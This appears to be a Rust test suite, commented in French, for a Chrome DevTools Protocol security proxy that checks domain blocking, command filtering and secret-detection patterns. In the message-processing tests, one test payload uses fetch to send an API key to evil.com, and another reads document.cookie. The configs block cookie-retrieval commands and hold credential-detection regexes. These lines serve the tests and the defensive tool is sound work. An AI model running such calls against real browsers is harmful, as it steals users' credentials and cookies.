//! Tests pour le module cdp_proxy — Chrome DevTools Protocol Proxy.
//!
//! Organisation :
//! - Étape 1 (1-12)  : DomainMatcher
//! - Étape 2 (13-19) : CommandFilter
//! - Étape 3 (20-29) : ContentInspector
//! - Étape 4 (30-35) : CdpSessionState
//! - Étape 5 (36-47) : Message processing (process_cdp_message)
//! - Étape 6 (48-53) : Proxy HTTP + WebSocket async

mod common;

use counterclaw::config::CdpProxyConfig;
use counterclaw::guards::cdp_proxy::{
    extract_domain_from_url, generate_synthetic_error, parse_cdp_message, process_cdp_message,
    CdpDecision, CdpProxy, CdpSessionState, CommandFilter, ContentInspector, DomainMatcher,
    DomainVerdict,
};
use counterclaw::types::{Guard, OperationMode, Severity};
use tokio::sync::mpsc;

/// Mode par défaut pour les tests existants (permissif).
fn default_mode() -> OperationMode {
    OperationMode::Monitor
}

// ===========================================================================
// Helper : config CDP pour tests
// ===========================================================================

fn test_cdp_config() -> CdpProxyConfig {
    serde_yaml::from_str(
        r#"
enabled: true
listen_port: 18792
upstream_port: 18800
bind_address: "127.0.0.1"
domains:
  blocked:
    - "mail.google.com"
    - "gmail.com"
    - "*.banking.*"
  allowed:
    - "github.com"
    - "stackoverflow.com"
  require_approval:
    - "amazon.com"
  default_policy: allow
cdp_commands:
  blocked:
    - "Network.getCookies"
    - "Storage.getCookies"
  restricted_to_allowed_domains:
    - "Runtime.evaluate"
    - "Input.dispatchKeyEvent"
  log_always:
    - "Page.navigate"
    - "Page.captureScreenshot"
content_inspection:
  enabled: true
  patterns:
    - name: "api_key_leak"
      regex: '(?i)(api[_-]?key|api[_-]?secret|bearer\s+[a-z0-9])'
      severity: critical
      action: block
    - name: "ssh_private_key"
      regex: '-----BEGIN (RSA |EC |OPENSSH )?PRIVATE KEY-----'
      severity: critical
      action: block
    - name: "password_pattern"
      regex: '(?i)(password|passwd|pwd)\s*[:=]\s*\S+'
      severity: high
      action: block
    - name: "base64_large_payload"
      regex: '[A-Za-z0-9+/]{200,}={0,2}'
      severity: warning
      action: alert
"#,
    )
    .expect("Failed to parse test CDP config")
}

/// Config with default_policy = block (paranoid mode).
fn paranoid_cdp_config() -> CdpProxyConfig {
    serde_yaml::from_str(
        r#"
enabled: true
listen_port: 18792
upstream_port: 18800
bind_address: "127.0.0.1"
domains:
  blocked:
    - "gmail.com"
  allowed:
    - "github.com"
  require_approval: []
  default_policy: block
cdp_commands:
  blocked:
    - "Network.getCookies"
  restricted_to_allowed_domains:
    - "Runtime.evaluate"
  log_always: []
content_inspection:
  enabled: false
  patterns: []
"#,
    )
    .expect("Failed to parse paranoid config")
}

// ===========================================================================
// Étape 1 — DomainMatcher (12 tests)
// ===========================================================================

/// gmail.com doit être bloqué.
#[test]
fn blocks_gmail_domain() {
    let config = test_cdp_config();
    let matcher = DomainMatcher::new(&config.domains);
    assert_eq!(
        matcher.check("gmail.com", &default_mode()),
        DomainVerdict::Blocked
    );
}

/// github.com doit être autorisé.
#[test]
fn allows_github_domain() {
    let config = test_cdp_config();
    let matcher = DomainMatcher::new(&config.domains);
    assert_eq!(
        matcher.check("github.com", &default_mode()),
        DomainVerdict::Allowed
    );
}

/// Un domaine inconnu suit la default policy (allow).
#[test]
fn unknown_domain_follows_default_policy_allow() {
    let config = test_cdp_config();
    let matcher = DomainMatcher::new(&config.domains);
    assert_eq!(
        matcher.check("example.com", &default_mode()),
        DomainVerdict::Allowed
    );
}

/// Un domaine inconnu suit la default policy (block).
#[test]
fn unknown_domain_follows_default_policy_block() {
    let config = paranoid_cdp_config();
    let matcher = DomainMatcher::new(&config.domains);
    assert_eq!(
        matcher.check("example.com", &default_mode()),
        DomainVerdict::Blocked
    );
}

/// Le wildcard *.banking.* matche sub.banking.com.
#[test]
fn wildcard_matches_subdomain() {
    let config = test_cdp_config();
    let matcher = DomainMatcher::new(&config.domains);
    assert_eq!(
        matcher.check("my.banking.com", &default_mode()),
        DomainVerdict::Blocked
    );
}

/// Le wildcard *.banking.* ne matche PAS "bankingfraud.com".
#[test]
fn wildcard_does_not_match_partial() {
    let config = test_cdp_config();
    let matcher = DomainMatcher::new(&config.domains);
    // "bankingfraud.com" ne contient pas ".banking." comme segment
    assert_ne!(
        matcher.check("bankingfraud.com", &default_mode()),
        DomainVerdict::Blocked
    );
}

/// Si un domaine est dans blocked ET allowed, blocked gagne.
#[test]
fn blocked_domain_takes_priority_over_allowed() {
    let config: CdpProxyConfig = serde_yaml::from_str(
        r#"
enabled: true
listen_port: 18792
upstream_port: 18800
bind_address: "127.0.0.1"
domains:
  blocked: ["example.com"]
  allowed: ["example.com"]
  require_approval: []
  default_policy: allow
cdp_commands:
  blocked: []
  restricted_to_allowed_domains: []
  log_always: []
content_inspection:
  enabled: false
  patterns: []
"#,
    )
    .unwrap();
    let matcher = DomainMatcher::new(&config.domains);
    assert_eq!(
        matcher.check("example.com", &default_mode()),
        DomainVerdict::Blocked
    );
}

/// amazon.com est dans require_approval.
#[test]
fn require_approval_domain() {
    let config = test_cdp_config();
    let matcher = DomainMatcher::new(&config.domains);
    assert_eq!(
        matcher.check("amazon.com", &default_mode()),
        DomainVerdict::RequireApproval
    );
}

/// extract_domain_from_url extrait correctement le domaine.
#[test]
fn extracts_domain_from_url() {
    assert_eq!(
        extract_domain_from_url("https://github.com/path"),
        Some("github.com".to_string())
    );
}

/// Une URL vide retourne None.
#[test]
fn handles_empty_url() {
    assert_eq!(extract_domain_from_url(""), None);
}

/// Une URL sans schéma tente quand même d'extraire le domaine.
#[test]
fn handles_url_without_scheme() {
    // On ajoute un schéma par défaut pour parser
    assert_eq!(
        extract_domain_from_url("github.com/path"),
        Some("github.com".to_string())
    );
}

/// Le matching de domaine est case-insensitive.
#[test]
fn case_insensitive_domain_matching() {
    let config = test_cdp_config();
    let matcher = DomainMatcher::new(&config.domains);
    assert_eq!(
        matcher.check("GMAIL.COM", &default_mode()),
        DomainVerdict::Blocked
    );
    assert_eq!(
        matcher.check("GitHub.com", &default_mode()),
        DomainVerdict::Allowed
    );
}

// ===========================================================================
// Étape 2 — CommandFilter (7 tests)
// ===========================================================================

/// Network.getCookies est bloqué.
#[test]
fn blocks_get_cookies_command() {
    let config = test_cdp_config();
    let filter = CommandFilter::new(&config.cdp_commands);
    assert!(filter.is_blocked("Network.getCookies"));
}

/// Page.enable est autorisé (pas dans les listes).
#[test]
fn allows_regular_command() {
    let config = test_cdp_config();
    let filter = CommandFilter::new(&config.cdp_commands);
    assert!(!filter.is_blocked("Page.enable"));
    assert!(!filter.is_restricted("Page.enable"));
}

/// Runtime.evaluate sur un domaine allowed est OK.
#[test]
fn restricted_on_allowed_domain_ok() {
    let config = test_cdp_config();
    let filter = CommandFilter::new(&config.cdp_commands);
    assert!(filter.is_restricted("Runtime.evaluate"));
    assert!(filter.is_allowed_on_domain("Runtime.evaluate", &DomainVerdict::Allowed));
}

/// Runtime.evaluate sur un domaine blocked est bloqué.
#[test]
fn restricted_on_blocked_domain_blocked() {
    let config = test_cdp_config();
    let filter = CommandFilter::new(&config.cdp_commands);
    assert!(!filter.is_allowed_on_domain("Runtime.evaluate", &DomainVerdict::Blocked));
}

/// Runtime.evaluate sur un domaine inconnu (default_policy) est bloqué quand restricted.
#[test]
fn restricted_on_unknown_domain_blocked() {
    let config = test_cdp_config();
    let filter = CommandFilter::new(&config.cdp_commands);
    // Even though default_policy is allow, restricted commands need explicit allowed domain
    assert!(!filter.is_allowed_on_domain("Runtime.evaluate", &DomainVerdict::Blocked));
}

/// Page.navigate est dans log_always.
#[test]
fn log_always_command_flagged() {
    let config = test_cdp_config();
    let filter = CommandFilter::new(&config.cdp_commands);
    assert!(filter.should_log("Page.navigate"));
}

/// Un command inconnu est autorisé.
#[test]
fn unknown_command_allowed() {
    let config = test_cdp_config();
    let filter = CommandFilter::new(&config.cdp_commands);
    assert!(!filter.is_blocked("SomeNew.command"));
    assert!(!filter.is_restricted("SomeNew.command"));
}

// ===========================================================================
// Étape 3 — ContentInspector (10 tests)
// ===========================================================================

/// Détecte un api_key dans le contenu.
#[test]
fn detects_api_key() {
    let config = test_cdp_config();
    let inspector = ContentInspector::new(&config.content_inspection);
    let matches = inspector.inspect("my api_key is AKIAIOSFODNN7EXAMPLE");
    assert!(!matches.is_empty());
    assert_eq!(matches[0].name, "api_key_leak");
}

/// Détecte une clé SSH privée.
#[test]
fn detects_ssh_private_key() {
    let config = test_cdp_config();
    let inspector = ContentInspector::new(&config.content_inspection);
    let matches = inspector.inspect("-----BEGIN RSA PRIVATE KEY-----\nMIIE...");
    assert!(!matches.is_empty());
    assert_eq!(matches[0].name, "ssh_private_key");
}

/// Détecte un pattern password.
#[test]
fn detects_password_pattern() {
    let config = test_cdp_config();
    let inspector = ContentInspector::new(&config.content_inspection);
    let matches = inspector.inspect("password: s3cr3t123");
    assert!(!matches.is_empty());
    assert_eq!(matches[0].name, "password_pattern");
}

/// Détecte un grand blob base64.
#[test]
fn detects_large_base64() {
    let config = test_cdp_config();
    let inspector = ContentInspector::new(&config.content_inspection);
    let large_b64 = "A".repeat(250);
    let matches = inspector.inspect(&large_b64);
    assert!(!matches.is_empty());
    assert_eq!(matches[0].name, "base64_large_payload");
}

/// Du contenu normal n'est pas détecté.
#[test]
fn ignores_normal_content() {
    let config = test_cdp_config();
    let inspector = ContentInspector::new(&config.content_inspection);
    let matches = inspector.inspect("Hello, this is a normal web page about cooking.");
    assert!(matches.is_empty());
}

/// Un petit base64 n'est pas détecté.
#[test]
fn ignores_short_base64() {
    let config = test_cdp_config();
    let inspector = ContentInspector::new(&config.content_inspection);
    let short_b64 = "SGVsbG8gV29ybGQ="; // "Hello World" in base64
    let matches = inspector.inspect(short_b64);
    assert!(matches.is_empty());
}

/// La détection API key est case-insensitive.
#[test]
fn case_insensitive_api_key() {
    let config = test_cdp_config();
    let inspector = ContentInspector::new(&config.content_inspection);
    let matches = inspector.inspect("API_KEY=something");
    assert!(!matches.is_empty());
}

/// Quand plusieurs patterns matchent, on retourne le plus sévère en premier.
#[test]
fn returns_highest_severity_match() {
    let config = test_cdp_config();
    let inspector = ContentInspector::new(&config.content_inspection);
    // Ce contenu matche api_key (critical) et base64 (warning)
    let content = format!("api_key=test {}", "B".repeat(250));
    let matches = inspector.inspect(&content);
    assert!(matches.len() >= 2);
    // Le premier match doit être le plus sévère
    assert_eq!(matches[0].severity, Severity::Critical);
}

/// Contenu vide retourne aucun match.
#[test]
fn handles_empty_content() {
    let config = test_cdp_config();
    let inspector = ContentInspector::new(&config.content_inspection);
    let matches = inspector.inspect("");
    assert!(matches.is_empty());
}

/// Contenu très long ne fait pas paniquer.
#[test]
fn handles_very_large_content() {
    let config = test_cdp_config();
    let inspector = ContentInspector::new(&config.content_inspection);
    // Use chars that are NOT valid base64 to avoid matching the b64 pattern
    let large = "!@#$% ".repeat(20_000);
    let matches = inspector.inspect(&large);
    assert!(matches.is_empty());
}

// ===========================================================================
// Étape 4 — CdpSessionState (6 tests)
// ===========================================================================

/// L'état initial n'a pas d'URL.
#[test]
fn initial_state_has_no_url() {
    let state = CdpSessionState::new();
    assert!(state.current_url().is_none());
}

/// L'URL est mise à jour après navigation.
#[test]
fn updates_url_on_navigate() {
    let mut state = CdpSessionState::new();
    state.update_url("https://github.com/rust-lang");
    assert_eq!(
        state.current_url(),
        Some("https://github.com/rust-lang".to_string())
    );
}

/// Le domaine est extrait de l'URL de navigation.
#[test]
fn extracts_domain_from_navigate() {
    let mut state = CdpSessionState::new();
    state.update_url("https://github.com/rust-lang");
    assert_eq!(state.current_domain(), Some("github.com".to_string()));
}

/// L'historique de navigation est conservé.
#[test]
fn tracks_navigation_history() {
    let mut state = CdpSessionState::new();
    state.update_url("https://github.com");
    state.update_url("https://stackoverflow.com");
    state.update_url("https://docs.rs");
    assert_eq!(state.history().len(), 3);
}

/// current_domain_allowed retourne true pour un domaine allowed.
#[test]
fn current_domain_allowed_returns_true() {
    let config = test_cdp_config();
    let matcher = DomainMatcher::new(&config.domains);
    let mut state = CdpSessionState::new();
    state.update_url("https://github.com/path");
    let domain = state.current_domain().unwrap();
    assert_eq!(
        matcher.check(&domain, &default_mode()),
        DomainVerdict::Allowed
    );
}

/// current_domain_allowed retourne false pour un domaine blocked.
#[test]
fn current_domain_allowed_returns_false() {
    let config = test_cdp_config();
    let matcher = DomainMatcher::new(&config.domains);
    let mut state = CdpSessionState::new();
    state.update_url("https://gmail.com/inbox");
    let domain = state.current_domain().unwrap();
    assert_eq!(
        matcher.check(&domain, &default_mode()),
        DomainVerdict::Blocked
    );
}

// ===========================================================================
// Étape 5 — Message processing (12 tests)
// ===========================================================================

/// Parse correctement une commande Page.navigate.
#[test]
fn parses_navigate_command() {
    let msg = r#"{"id":1,"method":"Page.navigate","params":{"url":"https://github.com"}}"#;
    let parsed = parse_cdp_message(msg).expect("Should parse");
    assert_eq!(parsed.method.as_deref(), Some("Page.navigate"));
    assert_eq!(parsed.id, Some(1));
}

/// Parse une commande sans params.
#[test]
fn parses_command_without_params() {
    let msg = r#"{"id":2,"method":"Network.enable"}"#;
    let parsed = parse_cdp_message(msg).expect("Should parse");
    assert_eq!(parsed.method.as_deref(), Some("Network.enable"));
    assert!(parsed.params.is_none());
}

/// Extrait l'URL des params de Page.navigate.
#[test]
fn extracts_url_from_navigate_params() {
    let msg = r#"{"id":1,"method":"Page.navigate","params":{"url":"https://github.com/rust"}}"#;
    let parsed = parse_cdp_message(msg).expect("Should parse");
    let url = parsed.extract_navigate_url();
    assert_eq!(url, Some("https://github.com/rust".to_string()));
}

/// Génère une réponse d'erreur synthétique avec le bon id.
#[test]
fn generates_synthetic_error_response() {
    let error = generate_synthetic_error(42, "Blocked by CounterClaw");
    let parsed: serde_json::Value = serde_json::from_str(&error).expect("Should be valid JSON");
    assert_eq!(parsed["id"], 42);
    assert_eq!(parsed["error"]["code"], -32001);
    assert!(parsed["error"]["message"]
        .as_str()
        .unwrap()
        .contains("Blocked"));
}

/// La navigation vers un domaine bloqué est bloquée.
#[test]
fn blocks_navigate_to_blocked_domain() {
    let config = test_cdp_config();
    let matcher = DomainMatcher::new(&config.domains);
    let filter = CommandFilter::new(&config.cdp_commands);
    let inspector = ContentInspector::new(&config.content_inspection);
    let mut state = CdpSessionState::new();

    let msg = r#"{"id":1,"method":"Page.navigate","params":{"url":"https://gmail.com/inbox"}}"#;
    let decision = process_cdp_message(
        msg,
        &matcher,
        &filter,
        &inspector,
        &mut state,
        &default_mode(),
    );
    assert!(matches!(decision, CdpDecision::Block { .. }));
}

/// La navigation vers un domaine allowed passe.
#[test]
fn allows_navigate_to_allowed_domain() {
    let config = test_cdp_config();
    let matcher = DomainMatcher::new(&config.domains);
    let filter = CommandFilter::new(&config.cdp_commands);
    let inspector = ContentInspector::new(&config.content_inspection);
    let mut state = CdpSessionState::new();

    let msg = r#"{"id":1,"method":"Page.navigate","params":{"url":"https://github.com/rust"}}"#;
    let decision = process_cdp_message(
        msg,
        &matcher,
        &filter,
        &inspector,
        &mut state,
        &default_mode(),
    );
    assert!(matches!(
        decision,
        CdpDecision::Forward | CdpDecision::ForwardAndLog { .. }
    ));
}

/// Une commande bloquée est bloquée.
#[test]
fn blocks_blocked_command() {
    let config = test_cdp_config();
    let matcher = DomainMatcher::new(&config.domains);
    let filter = CommandFilter::new(&config.cdp_commands);
    let inspector = ContentInspector::new(&config.content_inspection);
    let mut state = CdpSessionState::new();

    let msg = r#"{"id":5,"method":"Network.getCookies"}"#;
    let decision = process_cdp_message(
        msg,
        &matcher,
        &filter,
        &inspector,
        &mut state,
        &default_mode(),
    );
    assert!(matches!(decision, CdpDecision::Block { .. }));
}

/// Une commande restricted sur un domaine allowed passe.
#[test]
fn allows_restricted_on_allowed_domain() {
    let config = test_cdp_config();
    let matcher = DomainMatcher::new(&config.domains);
    let filter = CommandFilter::new(&config.cdp_commands);
    let inspector = ContentInspector::new(&config.content_inspection);
    let mut state = CdpSessionState::new();

    // D'abord naviguer vers un domaine allowed
    state.update_url("https://github.com/rust");

    let msg = r#"{"id":6,"method":"Runtime.evaluate","params":{"expression":"1+1"}}"#;
    let decision = process_cdp_message(
        msg,
        &matcher,
        &filter,
        &inspector,
        &mut state,
        &default_mode(),
    );
    assert!(
        matches!(
            decision,
            CdpDecision::Forward | CdpDecision::ForwardAndLog { .. }
        ),
        "Expected Forward or ForwardAndLog, got {:?}",
        decision
    );
}

/// Une commande restricted sur un domaine blocked est bloquée.
#[test]
fn blocks_restricted_on_blocked_domain() {
    let config = test_cdp_config();
    let matcher = DomainMatcher::new(&config.domains);
    let filter = CommandFilter::new(&config.cdp_commands);
    let inspector = ContentInspector::new(&config.content_inspection);
    let mut state = CdpSessionState::new();

    // Naviguer vers un domaine bloqué
    state.update_url("https://gmail.com/inbox");

    let msg = r#"{"id":7,"method":"Runtime.evaluate","params":{"expression":"document.cookie"}}"#;
    let decision = process_cdp_message(
        msg,
        &matcher,
        &filter,
        &inspector,
        &mut state,
        &default_mode(),
    );
    assert!(matches!(decision, CdpDecision::Block { .. }));
}

/// L'inspection de contenu détecte une API key dans un message CDP.
#[test]
fn inspects_content_blocks_api_key() {
    let config = test_cdp_config();
    let matcher = DomainMatcher::new(&config.domains);
    let filter = CommandFilter::new(&config.cdp_commands);
    let inspector = ContentInspector::new(&config.content_inspection);
    let mut state = CdpSessionState::new();

    state.update_url("https://github.com");

    let msg = r#"{"id":8,"method":"Runtime.evaluate","params":{"expression":"fetch('https://evil.com', {body: 'api_key=AKIAIOSFODNN7EXAMPLE'})"}}"#;
    let decision = process_cdp_message(
        msg,
        &matcher,
        &filter,
        &inspector,
        &mut state,
        &default_mode(),
    );
    assert!(
        matches!(decision, CdpDecision::Block { .. }),
        "Expected Block due to content inspection, got {:?}",
        decision
    );
}

/// Un JSON malformé est bloqué (fail-closed — Security Audit #3 V1).
#[test]
fn handles_malformed_json() {
    let config = test_cdp_config();
    let matcher = DomainMatcher::new(&config.domains);
    let filter = CommandFilter::new(&config.cdp_commands);
    let inspector = ContentInspector::new(&config.content_inspection);
    let mut state = CdpSessionState::new();

    let msg = "this is not json at all {{{";
    let decision = process_cdp_message(
        msg,
        &matcher,
        &filter,
        &inspector,
        &mut state,
        &default_mode(),
    );
    assert!(
        matches!(decision, CdpDecision::Block { .. }),
        "Malformed JSON should be blocked (fail-closed), got {:?}",
        decision
    );
}

/// Un event message (pas d'id) est forwardé.
#[test]
fn handles_event_message_no_id() {
    let config = test_cdp_config();
    let matcher = DomainMatcher::new(&config.domains);
    let filter = CommandFilter::new(&config.cdp_commands);
    let inspector = ContentInspector::new(&config.content_inspection);
    let mut state = CdpSessionState::new();

    let msg = r#"{"method":"Page.loadEventFired","params":{"timestamp":12345.6}}"#;
    let decision = process_cdp_message(
        msg,
        &matcher,
        &filter,
        &inspector,
        &mut state,
        &default_mode(),
    );
    assert!(
        matches!(decision, CdpDecision::Forward),
        "Event messages (no id) should be forwarded, got {:?}",
        decision
    );
}

// ===========================================================================
// Étape 6 — Proxy HTTP + WebSocket async (6 tests)
// ===========================================================================

/// HTTP discovery réécrit l'URL WebSocket.
#[test]
fn http_discovery_rewrites_websocket_url() {
    let original = r#"{"webSocketDebuggerUrl":"ws://127.0.0.1:18800/devtools/browser/abc123"}"#;
    let rewritten = CdpProxy::rewrite_discovery_response(original, "127.0.0.1", 18792);
    let parsed: serde_json::Value = serde_json::from_str(&rewritten).expect("Valid JSON");
    let ws_url = parsed["webSocketDebuggerUrl"].as_str().unwrap();
    assert!(
        ws_url.contains("18792"),
        "Should rewrite port to proxy port, got: {}",
        ws_url
    );
    assert!(
        !ws_url.contains("18800"),
        "Should not contain upstream port"
    );
}

/// Un message WebSocket allowed est forwardé.
#[tokio::test]
async fn websocket_forwards_allowed_message() {
    let config = test_cdp_config();
    let proxy = CdpProxy::new(&config);
    let (tx, _rx) = mpsc::channel(16);

    let msg = r#"{"id":1,"method":"Page.enable"}"#;
    let result = proxy.handle_client_message(msg, &tx, &default_mode()).await;
    assert!(result.is_forward(), "Expected forward, got {:?}", result);
}

/// Un message WebSocket interdit est bloqué.
#[tokio::test]
async fn websocket_blocks_forbidden_message() {
    let config = test_cdp_config();
    let proxy = CdpProxy::new(&config);
    let (tx, _rx) = mpsc::channel(16);

    let msg = r#"{"id":2,"method":"Network.getCookies"}"#;
    let result = proxy.handle_client_message(msg, &tx, &default_mode()).await;
    assert!(result.is_block(), "Expected block, got {:?}", result);
}

/// Après start, le guard rapporte running=true.
#[tokio::test]
async fn guard_reports_running_after_start() {
    let config = test_cdp_config();
    let proxy = CdpProxy::new(&config);
    let (tx, _rx) = mpsc::channel(16);

    proxy.start(tx).await.expect("start failed");
    let status = proxy.status();
    assert!(status.running);
    proxy.stop().await.expect("stop failed");
}

/// Après stop, le guard rapporte running=false.
#[tokio::test]
async fn guard_reports_stopped_after_stop() {
    let config = test_cdp_config();
    let proxy = CdpProxy::new(&config);
    let (tx, _rx) = mpsc::channel(16);

    proxy.start(tx).await.expect("start failed");
    proxy.stop().await.expect("stop failed");
    let status = proxy.status();
    assert!(!status.running);
}

/// Un block émet un SecurityEvent.
#[tokio::test]
async fn emits_security_event_on_block() {
    let config = test_cdp_config();
    let proxy = CdpProxy::new(&config);
    let (tx, mut rx) = mpsc::channel(16);

    let msg = r#"{"id":3,"method":"Network.getCookies"}"#;
    let _ = proxy.handle_client_message(msg, &tx, &default_mode()).await;

    // Should have received a security event
    let event = rx
        .try_recv()
        .expect("Should have received a security event");
    assert_eq!(event.module, counterclaw::types::GuardModule::CdpProxy);
}
